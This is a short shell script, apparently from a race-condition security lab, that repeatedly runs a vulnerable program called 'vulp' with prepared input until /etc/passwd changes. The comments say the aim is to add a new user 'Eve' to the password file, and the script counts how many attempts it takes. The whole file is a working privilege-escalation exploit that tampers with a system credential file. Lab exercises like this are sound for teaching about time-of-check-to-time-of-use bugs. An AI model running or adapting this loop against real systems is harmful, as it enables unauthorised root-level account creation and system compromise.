#!/bin/sh

# Save attributes of passwd file into two different varibles
old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`

# While loop will continue until the variables get different value
while [ "$old" = "$new" ]
do

	./vulp<passwd_input
	# Add a new user Eve to the passwd file
	new=`ls -l /etc/passwd`
	counter=`expr $counter + 1`
	echo "$counter\n"

done

echo "STOP... The file has been changed"
echo "Total number of loops: $counter"
